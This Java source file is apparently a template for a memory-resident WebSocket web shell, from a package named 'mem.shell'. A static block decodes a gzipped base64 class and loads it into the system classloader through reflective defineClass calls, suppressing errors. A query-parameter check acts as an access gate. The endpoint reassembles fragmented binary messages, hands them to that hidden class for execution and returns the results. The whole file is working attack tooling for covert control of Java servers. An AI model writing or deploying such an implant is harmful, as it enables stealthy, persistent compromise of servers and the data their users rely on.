package org.leo.jmg.mem.shell.http;

import java.lang.reflect.InvocationTargetException;

public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.websocket.MessageHandler.Whole<java.nio.ByteBuffer>{
    private static final int MAX_MESSAGE_BYTES = 16 * 1024 * 1024;
    private static final int MAX_FRAME_BYTES = 64 * 1024;
    private static final int FRAME_HEADER_BYTES = 1 + 8 + 4 + 4 + 4;
    private static final int MAX_FRAGMENT_PAYLOAD_BYTES = MAX_FRAME_BYTES - FRAME_HEADER_BYTES;
    private static final byte TYPE_DATA = 1;

    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private javax.websocket.Session session;
    private final java.util.concurrent.ConcurrentHashMap<Long, Object[]> inboundMessages =
            new java.util.concurrent.ConcurrentHashMap<Long, Object[]>();
    private final java.util.concurrent.atomic.AtomicInteger bufferedInboundBytes =
            new java.util.concurrent.atomic.AtomicInteger();

    static {
        try {
            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            java.util.zip.GZIPInputStream gzipInputStream=new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(decodeBase64(coreClass)));
            while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            java.lang.reflect.Method defineClassMethod = null;
            defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), new Object[]{null, byteArrayOutputStream.toByteArray(), Integer.valueOf(0), byteArrayOutputStream.size()});
        }catch (Exception exception){
        }
    }

    @Override
    public void onOpen(javax.websocket.Session session, javax.websocket.EndpointConfig endpointConfig) {
        // 门禁：配置了 headerName/headerValue 时，校验查询参数（ws://host/path?name=value）
        // 与 HTTP 协议的 Header 门禁对应；未配置时不启用 Header 门禁
        if (headerName != null && headerName.length() > 0
                && headerValue != null && headerValue.length() > 0) {
            String qs = session.getQueryString();
            if (qs == null || !qs.contains(headerName + "=" + headerValue)) {
                try { session.close(); } catch (Exception ignored) {}
                return;
            }
        }
        this.session = session;
        session.addMessageHandler(this);
        session.setMaxBinaryMessageBufferSize(128 * 1024);
    }

    @Override
    public void onMessage(java.nio.ByteBuffer source) {
        Long messageId = null;
        try {
            if (source == null || source.remaining() < FRAME_HEADER_BYTES) {
                throw new java.io.IOException("incomplete frame header");
            }
            java.nio.ByteBuffer buffer = source.slice();
            byte frameType = buffer.get();
            messageId = Long.valueOf(buffer.getLong());
            int fragmentIndex = buffer.getInt();
            int fragmentCount = buffer.getInt();
            int totalLength = buffer.getInt();

            if (frameType != TYPE_DATA || totalLength < 0 || totalLength > MAX_MESSAGE_BYTES) {
                throw new java.io.IOException("invalid frame metadata");
            }
            int expectedCount = Math.max(1, (totalLength + MAX_FRAGMENT_PAYLOAD_BYTES - 1)
                    / MAX_FRAGMENT_PAYLOAD_BYTES);
            if (fragmentCount != expectedCount || fragmentIndex < 0 || fragmentIndex >= fragmentCount) {
                throw new java.io.IOException("invalid fragment position");
            }
            int expectedPayloadLength = Math.min(MAX_FRAGMENT_PAYLOAD_BYTES,
                    totalLength - fragmentIndex * MAX_FRAGMENT_PAYLOAD_BYTES);
            if (buffer.remaining() != expectedPayloadLength) {
                throw new java.io.IOException("invalid fragment length");
            }

            byte[] payload = new byte[buffer.remaining()];
            buffer.get(payload);
            Object[] state = inboundMessages.get(messageId);
            if (state == null) {
                if (fragmentIndex != 0) {
                    throw new java.io.IOException("message does not start at fragment zero");
                }
                Object[] created = new Object[]{
                        new java.io.ByteArrayOutputStream(totalLength),
                        Integer.valueOf(0), Integer.valueOf(fragmentCount), Integer.valueOf(totalLength)
                };
                Object[] previous = inboundMessages.putIfAbsent(messageId, created);
                state = previous == null ? created : previous;
            }

            byte[] request = null;
            synchronized (state) {
                int nextIndex = ((Integer) state[1]).intValue();
                if (((Integer) state[2]).intValue() != fragmentCount
                        || ((Integer) state[3]).intValue() != totalLength
                        || nextIndex != fragmentIndex) {
                    throw new java.io.IOException("fragment sequence mismatch");
                }
                java.io.ByteArrayOutputStream requestStream =
                        (java.io.ByteArrayOutputStream) state[0];
                int bufferedBytes = bufferedInboundBytes.addAndGet(payload.length);
                if (bufferedBytes > MAX_MESSAGE_BYTES) {
                    bufferedInboundBytes.addAndGet(-payload.length);
                    throw new java.io.IOException("inbound buffer limit exceeded");
                }
                requestStream.write(payload);
                state[1] = Integer.valueOf(nextIndex + 1);
                if (nextIndex + 1 == fragmentCount) {
                    if (requestStream.size() != totalLength) {
                        throw new java.io.IOException("incomplete message");
                    }
                    request = requestStream.toByteArray();
                }
            }

            if (request != null) {
                inboundMessages.remove(messageId, state);
                bufferedInboundBytes.addAndGet(-request.length);
                java.io.ByteArrayOutputStream coreStream = new java.io.ByteArrayOutputStream();
                coreStream.write(request);
                try {
                    ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{coreStream});
                } catch (Throwable e) {
                    throw new IllegalStateException("Core invocation failed", e);
                }
                byte[] response = coreStream.toByteArray();
                if (response.length > MAX_MESSAGE_BYTES) {
                    throw new java.io.IOException("response exceeds message limit");
                }
                sendResponse(messageId.longValue(), response);
            }
        } catch (Throwable ignored) {
            if (messageId != null) {
                Object[] removed = inboundMessages.remove(messageId);
                if (removed != null) {
                    synchronized (removed) {
                        bufferedInboundBytes.addAndGet(-((java.io.ByteArrayOutputStream) removed[0]).size());
                    }
                }
            }
        }
    }

    @Override
    public void onClose(javax.websocket.Session session, javax.websocket.CloseReason closeReason) {
        inboundMessages.clear();
        bufferedInboundBytes.set(0);
    }

    private void sendResponse(long messageId, byte[] response) throws java.io.IOException {
        int fragmentCount = Math.max(1, (response.length + MAX_FRAGMENT_PAYLOAD_BYTES - 1)
                / MAX_FRAGMENT_PAYLOAD_BYTES);
        synchronized (session) {
            for (int fragmentIndex = 0; fragmentIndex < fragmentCount; fragmentIndex++) {
                int offset = fragmentIndex * MAX_FRAGMENT_PAYLOAD_BYTES;
                int payloadLength = Math.min(MAX_FRAGMENT_PAYLOAD_BYTES, response.length - offset);
                java.nio.ByteBuffer frame = java.nio.ByteBuffer.allocate(FRAME_HEADER_BYTES + payloadLength);
                frame.put(TYPE_DATA);
                frame.putLong(messageId);
                frame.putInt(fragmentIndex);
                frame.putInt(fragmentCount);
                frame.putInt(response.length);
                frame.put(response, offset, payloadLength);
                frame.flip();
                session.getBasicRemote().sendBinary(frame);
            }
        }
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }
}
